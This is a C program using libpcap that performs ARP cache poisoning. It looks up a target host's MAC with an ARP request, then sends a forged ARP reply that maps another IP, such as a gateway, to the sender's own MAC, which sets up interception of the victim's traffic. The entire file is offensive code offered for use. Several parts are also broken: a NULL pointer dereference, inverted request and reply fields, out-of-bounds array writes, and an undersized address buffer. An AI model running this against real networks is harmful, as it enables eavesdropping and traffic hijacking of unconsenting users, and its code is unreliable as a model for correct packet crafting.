#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <stdlib.h>
#include <pcap.h>
#include <errno.h>

int get_mac_by_inf(u_char mac[6], const char *dev){
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	
	if(ioctl(fd, SIOCGIFHWADDR, &ifr) != 0){
		printf("can't get MAC Address\n");
		close(fd);
		return 0;	
	}	

	for (int i = 0; i < 6; ++i){
		mac[i] = ifr.ifr_addr.sa_data[i];
	}

	close(fd);
	return 1;
}

int get_ip_by_inf(u_char **ip, const char *dev){
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct sockaddr_in *sin;

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , dev , IFNAMSIZ-1);

	if(ioctl(fd, SIOCGIFADDR, &ifr) != 0){
		printf("can't get IP Address\n");
		close(fd);
		return 0;
	}
	 
	close(fd);
	
	sin = (struct sockaddr_in*) &ifr.ifr_addr;
	inet_ntop(AF_INET, &(sin->sin_addr), *ip, 10);
	
	return 1;
}

void
make_arp_packet(u_char **packet, int *length, int opcode, u_char *my_ip, u_char *vic_ip, u_char *my_mac, u_char *vic_mac){
	struct in_addr my_addr;
	struct in_addr vic_addr;

	struct ether_header eth;
	struct ether_arp arp;
	
	inet_pton(AF_INET, my_ip, &my_addr);
	inet_pton(AF_INET, vic_ip, &vic_addr);
	
	if(opcode == ARPOP_REQUEST){
		for(int i=0; i<6; i++)
			eth.ether_dhost[i] = 0xff;
	}
	else{
		for(int i=0; i<6; i++)
			eth.ether_dhost[i] = vic_mac[i];	
	}

	//fill the ethernet header
	for(int i=0; i<6; i++){
		eth.ether_shost[i] = my_mac[i];
	}

	eth.ether_type = htons(ETHERTYPE_ARP);
	
	memcpy(*packet, &eth, sizeof(eth));
	(*length) += sizeof(eth);

	//fill the arp request header
	arp.arp_hrd = htons(0x0001);
	arp.arp_pro = htons(0x0800);
	arp.arp_hln = 0x06;
	arp.arp_pln = 0x04;
	arp.arp_op = htons(opcode);
	
	for(int i=0; i<6; i++){
		arp.arp_sha[i] = my_mac[i];
	}
	
	if(opcode == ARPOP_REQUEST){
		for(int i=0; i<6; i++)
			arp.arp_tha[i] = vic_mac[i];
	}
	else{
			for(int i=0; i<6; i++)
				arp.arp_tha[i] = 0x00;
	}

	memcpy(arp.arp_spa, &my_addr, sizeof(my_addr));
	memcpy(arp.arp_tpa, &vic_addr, sizeof(vic_addr));
	
	memcpy((*packet)+(*length), &arp, sizeof(arp));
	(*length) += sizeof(arp);

}

int main(int argc, char *argv[]){
	pcap_t *handle;			
	char errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 net;
	bpf_u_int32 mask;
	struct bpf_program fp;
	char filter_exp[100] = "arp src host ";
	struct pcap_pkthdr *header;	

	struct ether_header eth;
	struct ether_arp arp;

	int length = 0;

	u_char my_mac[6];
	u_char vic_mac[6];

	u_char* my_ip_addr;

	u_char *packet;
	const u_char *recv_packet;
	
	struct in_addr net_addr;
	struct in_addr my_addr;
	struct in_addr v_addr;	
	struct in_addr t_addr;

	if(argc < 4){
		printf("Nop!!\n");
		return -1;	
	}
	
	strncat(filter_exp, argv[2], strlen(argv[2]));

	printf("%s\n", filter_exp);

	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
		return -2;
	}	

	if(pcap_lookupnet(argv[1], &net, &mask, errbuf) == -1){
		fprintf(stderr, "Couldn't get net info %s: %s\n", argv[1], errbuf);
		return -3;
	}	

	if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1){
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return -4;
	}

	if(pcap_setfilter(handle, &fp) == -1){
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return -5;
	}

	packet = (u_char *)malloc(sizeof(u_char) * 1000);
	recv_packet = (u_char *)malloc(sizeof(u_char) * 1500);
	my_ip_addr = (u_char*)malloc(sizeof(u_char) * 16);

	get_mac_by_inf(my_mac, argv[1]);
	get_ip_by_inf(&my_ip_addr, argv[1]);
	
	make_arp_packet(&packet, &length, ARPOP_REQUEST, my_ip_addr, argv[2], my_mac, NULL);

	/*printf("packet length : %d\n", length);
	for(int i=0; i<length; i++)
		printf("%02x", packet[i]);
	
	printf("\n");*/

	if(pcap_sendpacket(handle, packet, length) != 0){
		fprintf(stderr, "\nError sending the packet : %s\n", pcap_geterr(handle));
		return -1;	
	}
	
	while(pcap_next_ex(handle, &header, &recv_packet) != 1);

	for(int i=6; i<12; i++)
		vic_mac[i] = recv_packet[i];

	memset(packet, 0, length);
	
	length = 0;
	
	make_arp_packet(&packet, &length, ARPOP_REPLY, argv[3], argv[2], my_mac, vic_mac);

	if(pcap_sendpacket(handle, packet, length) != 0){
		fprintf(stderr, "\nError sending the packet : %s\n", pcap_geterr(handle));
		return -1;	
	}
	
	return 0;
}
